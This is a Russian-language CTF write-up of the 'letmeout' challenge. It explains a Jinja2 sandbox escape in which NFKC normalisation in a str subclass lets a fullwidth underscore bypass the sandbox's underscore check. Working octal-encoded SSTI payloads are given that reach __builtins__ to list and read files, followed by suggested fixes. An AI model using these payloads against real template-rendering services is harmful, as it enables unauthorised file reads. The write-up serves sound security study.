# letmeout — побег из песочницы Jinja2 (SSTI)

Nov 1, 2026 · @Demian

Сервис — это Jinja2-«калькулятор» на `SandboxedEnvironment`, который рендерит пользовательский шаблон под тремя ограничениями: только ASCII, не более 170 символов и не более 3 различных букв. Побег из песочницы строится на связке «фолбэк `getitem` + NFKC-нормализация в пользовательском классе `Tag`»: она обходит запрет на доступ к атрибутам с подчёркиванием и в итоге даёт чтение произвольных файлов. Флаг: `hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___78710da249}`.

## Задача

Сервис представляется «калькулятором» и предлагает ввести Jinja2-выражение вида `{{ 1+1 }}`. Каждая присланная строка рендерится в песочнице Jinja2 (`jail.py`), но обложена проверками, которые и делают задачу интересной. Подключение — по TLS на порт 1337; на одно соединение даётся 32 попытки.

Перед циклом создаётся окружение, из которого вырезано почти всё:

- `env.globals.clear()` — нет `range`, `cycler`, `lipsum`, `dict`, `namespace` и прочих привычных точек входа для SSTI;
- `env.filters.clear()`, после чего добавляются ровно **два** фильтра под **случайными** именами из набора `buff, cuff, duff, …, tuff`. Они ведут на функции `rich` и `plain`.

Строка принимается к рендеру, только если проходит все три проверки одновременно:

- `layout.isascii()` — весь ввод в ASCII;
- `len(layout) <= 170` — не длиннее 170 символов;
- различных букв (`c.isalpha()`) — не больше **3**.

Остальные важные детали окружения:

- класс `Tag(str)`, чей `__str__` возвращает `unicodedata.normalize("NFKC", self)`;
- `rich(x) = Tag(x)` — нормализует **лениво** (только при `str()`); `plain(x) = str(Tag(x))` — нормализует сразу;
- флаг лежит в `/flags/<8 hex-символов>` вперемешку с тремя обманками (`not the flag you're looking for`), права файлов `0444`, процесс запущен от `nobody`, рабочая директория — `/flags`;
- из образа удалены `/bin/sh`, `bash`, `dash` — значит, классический реверс-шелл через `os.system` не вариант, читать файл придётся средствами самого Python.

## Песочница Jinja2

`SandboxedEnvironment` переопределяет `getattr` и `getitem` и перед возвратом значения зовёт `is_safe_attribute(obj, attr, value)`:

```python
def is_safe_attribute(self, obj, attr, value):
    return not (attr.startswith('_') or is_internal_attribute(obj, attr))
```

Поэтому любой атрибут, имя которого начинается с `_`, недоступен. Это сразу убивает классическую цепочку SSTI `().__class__.__mro__[...].__subclasses__()[...].__init__.__globals__[...]`. Вдобавок `is_internal_attribute` режет `mro`, атрибуты объектов code / frame / traceback и всё, что `startswith('__')`.

Что ещё перекрыто:

- `str.format` и `str.format_map` перехвачены (`wrap_str_format`), поэтому трюк `'{0.__class__}'.format(x)` не работает;
- `env.globals` и `env.filters` очищены, так что `cycler`, `lipsum`, `range`, `namespace` и прочие привычные точки входа недоступны;
- остаются только литералы, операторы, тесты (`is ...`) и два пользовательских фильтра.

Итог: нужен настоящий обход проверки на подчёркивание — его и даёт связка NFKC + `Tag`.

## Ключевой баг: getitem + NFKC + Tag

Вся соль — в фолбэке `getitem` песочницы:

```python
def getitem(self, obj, argument):
    try:
        return obj[argument]          # (1) прямой subscript - БЕЗ проверки
    except (TypeError, LookupError):
        if isinstance(argument, str):
            attr = str(argument)      # (2) тут срабатывает Tag.__str__ -> NFKC
            value = getattr(obj, attr)
            ...
            if self.is_safe_attribute(obj, argument, value):  # (3) проверка на СЫРОМ argument
                return value
            return self.unsafe_undefined(obj, argument)
    return self.undefined(...)
```

Отсюда два следствия:

- **(1)** Если `obj` — словарь, а `argument` — реальный ключ, значение возвращается сразу, вообще без `is_safe_attribute`. Значит, для ключей словаря (например, `__builtins__` в словаре `__main__`) маскировка не нужна.
- **(2)+(3)** В ветке `getattr` имя для `getattr` берётся нормализованным (`str(argument)`), а в `is_safe_attribute` передаётся **сырой** `argument`. Рассинхрон!

Теперь понятно, зачем в задаче `Tag` и `rich`. `Tag` — подкласс `str`, чей `__str__` делает NFKC. Если подсунуть в качестве ключа `Tag`, у которого:

- сырой вид **не** начинается с `_` (значит, `argument.startswith('_')` == `False` -> проверка пройдена);
- а `str(argument)` (NFKC) равен настоящему дандеру,

то `getattr` достанет настоящий атрибут, а проверка его пропустит.

**Маскировка подчёркивания.** Достаточно замаскировать только ПЕРВЫЙ символ: берём `＿` (U+FF3F, FULLWIDTH LOW LINE). Он не ASCII-`_`, поэтому `startswith('_')` даёт `False`, но `NFKC('＿') == '_'`. Остальные подчёркивания можно оставить обычными. Пример ключа, нормализующегося в `__str__`: сырой вид `＿_str__`.

Почему именно `rich`, а не `plain`: `rich(x)=Tag(x)` откладывает нормализацию до момента `str()` внутри `getitem` — ровно там, где проверка уже смотрит на сырой ключ. А `plain(x)=str(Tag(x))` нормализует сразу, и ключ уже с ASCII-`_` в начале — проверка его зарубит.

## Как уложиться в ASCII, 170 символов и 3 буквы

Самое злое ограничение — «не больше 3 различных букв». Ключевое наблюдение: имя любого фильтра из `NAMES` имеет вид `X+uff`, то есть ровно три разные буквы `{X, u, f}` (например `buff` -> `b, u, f`). Значит, один только вызов фильтра `|buff` уже съедает весь бюджет букв. Всё остальное надо писать без новых букв — только цифрами, подчёркиваниями и символами.

Спасает то, что строковые литералы Jinja понимают эскейпы:

- любой ASCII-символ строим октальным эскейпом `\NNN` (например `\163` = `s`, `\160` = `p`): в исходнике это только цифры, не буквы;
- подчёркивание пишем литералом — `_` не буква, бюджет не тратит;
- замаскированный первый `_` — через `＿` (буквы `u`, `f` и так входят в бюджет от имени фильтра).

Главное: `layout.isascii()` проверяет ИСХОДНИК шаблона, а не результат. Исходник `＿` или `\163` — чистый ASCII, а значение строки уже может быть не-ASCII. При этом NFKC над ASCII тождественна, поэтому все октальные буквы остаются собой — не-ASCII нужен только для маскировки первого подчёркивания.

Пример ключа, нормализующегося в `__str__` (видно, что настоящих букв нет, кроме имени фильтра):

```text
"＿_\163\164\162__"|buff
```

Итог: единственные настоящие буквы во всём пейлоаде — это буквы имени фильтра. Ровно 3, для любого из вариантов `buff … tuff`.

## Цепочка эксплуатации

Нужен объект с `__builtins__`. Удобный факт: у любой питоновской функции есть атрибут `__builtins__`, и это сразу **словарь** с `open`, `__import__` и всеми билтинами. Это позволяет не строить длинную цепочку через `__globals__`/`__subclasses__`.

Получаем функцию: `(0|rich)` — это `Tag("0")`, а его метод `__str__` — настоящая питоновская функция (определена в `jail.py`). Отсюда базовое выражение:

```text
builtins = (0|rich).__str__.__builtins__
```

Здесь `__str__` и `__builtins__` берутся с не-словарных объектов (Tag-экземпляр и bound-метод), значит путь идёт через `getattr` — их маскируем как Tag. А вот ключи уже готового словаря билтинов — `open`, `__import__`, `listdir`, `read` — берутся прямым subscriptом (ветка без проверки), поэтому их можно не маскировать, а просто закодировать окталью.

Дальше два шага (имя файла случайное, поэтому сначала листинг):

1. **Листинг каталога** — `builtins["__import__"]("os")["listdir"]()`. Рабочая директория уже `/flags`, поэтому `listdir()` без аргумента возвращает 4 имени.
2. **Чтение** — для каждого имени `builtins["open"](name)["read"]()`; настоящий флаг отличается от трёх обманок `not the flag you're looking for`.

Шелл не нужен вовсе — читаем файлы напрямую через `open`/`os.listdir`, поэтому вырезанные из образа `/bin/sh` и прочие не мешают.

## Финальные пейлоады и эксплойт

Оба пейлоада — ровно 170 символов, 3 различных буквы (буквы имени фильтра), только ASCII. Логическая форма — то, что реально вызывается:

```text
листинг: (0|R).__str__.__builtins__["__import__"]("os")["listdir"]()
чтение : (0|R).__str__.__builtins__["open"](name)["read"]()
```

Точный пейлоад чтения (R = `buff`, имя файла `a1b2c3d4`), ровно 170 символов:

```text
{{(0|buff)["＿_\163\164\162__"|buff]["＿_\142\165\151\154\164\151\156\163__"|buff]["\157\160\145\156"]("\141\061\142\062\143\063\144\064")["\162\145\141\144"]()}}
```

Замечания по кодировке:

- символ `＿` выше — это U+FF3F; в самом шаблоне первый символ ключа пишется ASCII-эскейпом `\u` + `ff3f` (иначе `isascii()` не пройдёт);
- буквы — октальные эскейпы: `\163`=s, `\142`=b, `\157`=o и т.д.;
- байт-в-байт генерация — в приложенном `exploit.py` (функции `dkey` и `plain_key`).

Скрипт `exploit.py` делает:

- перебирает имена из `NAMES` и шлёт пейлоад-листинг с каждым — осмысленно отвечает только настоящий `rich` (так он и определяется, и сразу даёт список файлов);
- читает 4 файла и печатает тот, что не обманка;
- укладывается в \~14 из 32 попыток.

Запуск: `python3 exploit.py <host> 1337` (TLS по умолчанию; `--no-tls` для локального теста).

## Флаг и выводы

Флаг: `hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___78710da249}`.

Название прямо отсылает к «normalize before you trust»: уязвимость именно в том, что проверка безопасности смотрит на сырой ключ, а `getattr` — на нормализованный. Это классический TOCTOU-рассинхрон «проверил одно, использовал другое» — тот же класс ошибок, что IDN-homograph и нормализация путей.

Как бы я это чинил:

- проверять безопасность по ТОМУ ЖЕ значению, что уходит в `getattr`: нормализовать `argument` ДО проверки, то есть `is_safe_attribute(obj, str(argument), value)`;
- либо запретить подклассы `str` с переопределённым `__str__` в качестве ключей, либо сравнивать на `_` уже после нормализации;
- не давать недоверенному коду фильтр, возвращающий нормализующий `str`-подкласс — именно он здесь «оружие»;
- не полагаться на `SandboxedEnvironment` как на границу безопасности для недоверенных шаблонов: нужна реальная изоляция (отдельный процесс, seccomp, без доступа к ФС). В задаче часть этого есть (`nobody`, удалённые шеллы, CPU-лимит), но read-границы по файлам не хватило.

Общий урок: Unicode-нормализация (NFKC) скрытно меняет строку после валидации — всякая проверка безопасности должна работать над той же формой строки, что и последующее действие.
